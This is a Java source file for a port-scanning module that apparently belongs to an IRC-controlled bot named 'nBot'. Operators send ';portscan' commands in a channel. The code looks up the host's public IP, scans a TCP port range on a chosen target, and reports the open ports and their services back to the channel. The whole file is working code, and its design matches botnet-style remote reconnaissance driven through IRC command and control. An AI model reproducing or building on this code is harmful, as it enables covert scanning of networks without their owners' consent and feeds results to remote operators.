
import java.net.*;
import java.util.ArrayList;
import java.util.List;
import java.io.IOException;
import java.util.concurrent.Executors;

public class PortScanner implements Runnable, Handler {

    private List<String> openPorts = new ArrayList<String>();
    private static boolean scanning;
    private String remoteIp;
    private String local;
    private int range1;
    private int range2;

    public boolean processCommand(String[] args, String nick) {
        if (args[0].equals(";portscan")) {
            initScan(args[1], args[2], Integer.parseInt(args[3]), Integer.parseInt(args[4]));
            IRC.sendMessage(Config.channel, Colors.BLUE + "[nBot]" + Colors.BLACK + " Starting portscan!");
            return true;
        }
        if (args[0].equals(";stopportscan")) {
            scanning = false;
            IRC.sendMessage(Config.channel, Colors.BLUE + "[nBot]" + Colors.BLACK + " Portscan stopped!");
            return true;
        }
        return false;
    }

    public void initScan(String local, String ip, int range1, int range2) {
        this.remoteIp = ip;
        this.local = local;
        this.range1 = range1;
        this.range2 = range2;
        Executors.newSingleThreadExecutor().execute(this);
    }

    @Override
    public void run() {
        InetAddress ia = null;
        scanning = true;
        try {
            if (local.equals("local")) {
                IRC.sendMessage(Config.channel,
                        "Portscanning local network.");
                ia = InetAddress.getByName(Misc.getIPAddress("http://whatismyip.com/automation/n09230945.asp"));
            } else {
                IRC.sendMessage(Config.channel, "Portscanning " + this.remoteIp);
                ia = InetAddress.getByName(this.remoteIp);
            }
        } catch (UnknownHostException e) {
            IRC.sendMessage(Config.channel, "Error retriving IP address!");
        }
        doScan(ia);
    }

    public void doScan(InetAddress iAddress) {
        String host = iAddress.getHostName();
        for (int port = range1; port < range2; port++) {
            try {
                if (!scanning) {
                    break;
                }
                Socket sock = new Socket();
                sock.bind(null);
                sock.connect(new InetSocketAddress(iAddress, port), 150);
                sock.close();
                String service = PortServices.portServices.get(port);
                IRC.sendMessage(Config.channel, Colors.BLUE + "[nBot]" + Colors.BLACK + ""+host + ":" + port+" Open! Service: "+service);
                this.openPorts.add(port+":"+service);
            } catch (IOException ex) { /** The port is closed*/ }
        }
        String openPortList = openPorts.toString();
        IRC.sendMessage(Config.channel, Colors.BLUE + "[nBot]" + Colors.BLACK + "PortScan Results: " + openPortList);
    }
}